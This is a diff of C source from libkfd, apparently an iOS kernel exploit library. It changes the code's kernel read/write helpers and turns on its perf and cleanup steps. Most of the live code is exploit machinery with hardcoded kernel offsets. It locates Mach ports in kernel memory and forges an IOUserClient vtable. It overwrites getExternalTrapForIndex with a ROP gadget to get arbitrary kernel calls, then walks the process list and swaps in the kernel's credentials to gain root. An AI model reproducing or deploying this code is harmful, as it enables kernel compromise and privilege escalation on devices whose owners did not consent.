@@ -13,7 +13,7 @@
 #define CONFIG_TIMER 1
 
 #include "libkfd/common.h"
-#include "fun.h"
+#include "fun/krw.h"
 
 /*
  * The public API of libkfd.
@@ -57,8 +57,9 @@ struct info {
         i32 pid;
         u64 tid;
         u64 vid;
+        bool ios;
+        char osversion[8];
         u64 maxfilesperproc;
-        char kern_version[512];
     } env;
     struct {
         u64 kernel_slide;
@@ -89,6 +90,19 @@ struct info {
 };
 
 struct perf {
+    u64 kernel_slide;
+    u64 gVirtBase;
+    u64 gPhysBase;
+    u64 gPhysSize;
+    struct {
+        u64 pa;
+        u64 va;
+    } ttbr[2];
+//    struct ptov_table_entry {
+//        u64 pa;
+//        u64 va;
+//        u64 len;
+//    } ptov_table[8];
     u64 kernelcache_index;
     struct {
         u64 kaddr;
@@ -147,6 +161,8 @@ struct kfd {
     struct krkw kwrite;
 };
 
+
+
 #include "libkfd/info.h"
 #include "libkfd/puaf.h"
 #include "libkfd/krkw.h"
@@ -187,8 +203,8 @@ u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
     puaf_run(kfd);
     krkw_run(kfd);
     info_run(kfd);
-//    perf_run(kfd);
-//    puaf_cleanup(kfd);
+    perf_run(kfd);
+    puaf_cleanup(kfd);
 
     timer_end();
     return (u64)(kfd);
@@ -219,41 +235,41 @@ uint64_t fake_client;
 uint64_t add_x0_x0_0x40_ret_func = 0;
 uint64_t proc_set_ucred_func = 0;
 
-uint32_t kread32(u64 kfd, uint64_t where) {
-    uint32_t out;
-    kread(kfd, where, &out, sizeof(uint32_t));
-    return out;
-}
-
-uint64_t kread64(u64 kfd, uint64_t where) {
-    uint64_t out;
-    kread(kfd, where, &out, sizeof(uint64_t));
-    return out;
-}
-
-void kwrite32(u64 kfd, uint64_t where, uint32_t what)
-{
-    u32 _buf[2] = {};
-    _buf[0] = what;
-    _buf[1] = kread32(kfd, where+4);
-    kwrite(kfd, &_buf, where, sizeof(u64));
-}
-
-void kwrite64(u64 kfd, uint64_t where, uint64_t what)
-{
-    u64 _buf[1] = {};
-    _buf[0] = what;
-    kwrite(kfd, &_buf, where, sizeof(u64));
-}
+//uint32_t kread32(u64 kfd, uint64_t where) {
+//    uint32_t out;
+//    kread(kfd, where, &out, sizeof(uint32_t));
+//    return out;
+//}
+//
+//uint64_t kread64(u64 kfd, uint64_t where) {
+//    uint64_t out;
+//    kread(kfd, where, &out, sizeof(uint64_t));
+//    return out;
+//}
+//
+//void kwrite32(u64 kfd, uint64_t where, uint32_t what)
+//{
+//    u32 _buf[2] = {};
+//    _buf[0] = what;
+//    _buf[1] = kread32(kfd, where+4);
+//    kwrite(kfd, &_buf, where, sizeof(u64));
+//}
+//
+//void kwrite64(u64 kfd, uint64_t where, uint64_t what)
+//{
+//    u64 _buf[1] = {};
+//    _buf[0] = what;
+//    kwrite(kfd, &_buf, where, sizeof(u64));
+//}
 
 uint64_t find_port(u64 kfd, mach_port_name_t port){
     struct kfd* kfd_struct = (struct kfd*)kfd;
     uint64_t task_addr = kfd_struct->info.kernel.current_task;
-    uint64_t itk_space = kread64(kfd, task_addr + 0x308);
-    uint64_t is_table = kread64(kfd, itk_space + 0x20);
+    uint64_t itk_space = kread64(task_addr + 0x308);
+    uint64_t is_table = kread64(itk_space + 0x20);
     uint32_t port_index = port >> 8;
     const int sizeof_ipc_entry_t = 0x18;
-    uint64_t port_addr = kread64(kfd, is_table + (port_index * sizeof_ipc_entry_t));
+    uint64_t port_addr = kread64(is_table + (port_index * sizeof_ipc_entry_t));
     return port_addr;
 }
 
@@ -266,7 +282,7 @@ uint64_t dirty_kalloc(u64 kfd, size_t size) {
     while (addr < end) {
         bool found = false;
         for (int i = 0; i < size; i+=4) {
-            uint32_t val = kread32(kfd, addr+i);
+            uint32_t val = kread32(addr+i);
             found = true;
             if (val != 0) {
                 found = false;
@@ -300,36 +316,36 @@ void init_kcall(u64 kfd) {
     }
     uint64_t uc_port = find_port(kfd, user_client);
     printf("Found port: 0x%llx\n", uc_port);
-    uint64_t uc_addr = kread64(kfd, uc_port + 0x48);
+    uint64_t uc_addr = kread64(uc_port + 0x48);
     printf("Found addr: 0x%llx\n", uc_addr);
-    uint64_t uc_vtab = kread64(kfd, uc_addr);
+    uint64_t uc_vtab = kread64(uc_addr);
     printf("Found vtab: 0x%llx\n", uc_vtab);
     uint64_t fake_vtable = dirty_kalloc(kfd, 0x1000);
     printf("Created fake_vtable at %016llx\n", fake_vtable);
     for (int i = 0; i < 0x200; i++) {
-        kwrite64(kfd, fake_vtable+i*8, kread64(kfd, uc_vtab+i*8));
+        kwrite64(fake_vtable+i*8, kread64(uc_vtab+i*8));
     }
     printf("Copied some of the vtable over\n");
     fake_client = dirty_kalloc(kfd, 0x2000);
     printf("Created fake_client at %016llx\n", fake_client);
     for (int i = 0; i < 0x200; i++) {
-        kwrite64(kfd, fake_client+i*8, kread64(kfd, uc_addr+i*8));
+        kwrite64(fake_client+i*8, kread64(uc_addr+i*8));
     }
     printf("Copied the user client over\n");
-    kwrite64(kfd, fake_client, fake_vtable);
-    kwrite64(kfd, uc_port + 0x48, fake_client);
-    kwrite64(kfd, fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
+    kwrite64(fake_client, fake_vtable);
+    kwrite64(uc_port + 0x48, fake_client);
+    kwrite64(fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
     printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
 }
 
 uint64_t kcall(u64 kfd, uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
-    uint64_t offx20 = kread64(kfd, fake_client+0x40);
-    uint64_t offx28 = kread64(kfd, fake_client+0x48);
-    kwrite64(kfd, fake_client+0x40, x0);
-    kwrite64(kfd, fake_client+0x48, addr);
+    uint64_t offx20 = kread64(fake_client+0x40);
+    uint64_t offx28 = kread64(fake_client+0x48);
+    kwrite64(fake_client+0x40, x0);
+    kwrite64(fake_client+0x48, addr);
     uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
-    kwrite64(kfd, fake_client+0x40, offx20);
-    kwrite64(kfd, fake_client+0x48, offx28);
+    kwrite64(fake_client+0x40, offx20);
+    kwrite64(fake_client+0x48, offx28);
     return returnval;
 }
 
@@ -338,7 +354,7 @@ uint64_t proc_of_pid(u64 kfd, pid_t pid)
     uint64_t proc = ((struct kfd*)kfd)->info.kernel.kernel_proc;
     while (proc != 0) {
         uint64_t pidptr = proc + 0x68;
-        uint32_t pid2 = kread32(kfd, pidptr);
+        uint32_t pid2 = kread32(pidptr);
         char name[32];
         kread(kfd, proc + 0x381, &name, 32);
         printf("FOUND: pid %d, name %s\n", pid2, name);
@@ -346,7 +362,7 @@ uint64_t proc_of_pid(u64 kfd, pid_t pid)
             printf("GOT IT\n");
             return proc;
         }
-        proc = kread64(kfd, proc + 0x8);
+        proc = kread64(proc + 0x8);
     }
     return 0;
 }
@@ -354,17 +370,17 @@ uint64_t proc_of_pid(u64 kfd, pid_t pid)
 void getRoot(u64 kfd, uint64_t proc_addr)
 {
     struct kfd* kfd_struct = (struct kfd*)kfd;
-    uint64_t self_ro = kread64(kfd, proc_addr + 0x20);
+    uint64_t self_ro = kread64(proc_addr + 0x20);
     printf("self_ro @ 0x%llx\n", self_ro);
-    uint64_t self_ucred = kread64(kfd, self_ro + 0x20);
+    uint64_t self_ucred = kread64(self_ro + 0x20);
     printf("ucred @ 0x%llx\n", self_ucred);
     printf("test_uid = %d\n", getuid());
 
     uint64_t kernproc = kfd_struct->info.kernel.kernel_proc;
     printf("kern proc @ %llx\n", kernproc);
-    uint64_t kern_ro = kread64(kfd, kernproc + 0x20);
+    uint64_t kern_ro = kread64(kernproc + 0x20);
     printf("kern_ro @ 0x%llx\n", kern_ro);
-    uint64_t kern_ucred = kread64(kfd, kern_ro + 0x20);
+    uint64_t kern_ucred = kread64(kern_ro + 0x20);
     printf("kern_ucred @ 0x%llx\n", kern_ucred);
 
     // use proc_set_ucred to set kernel ucred.
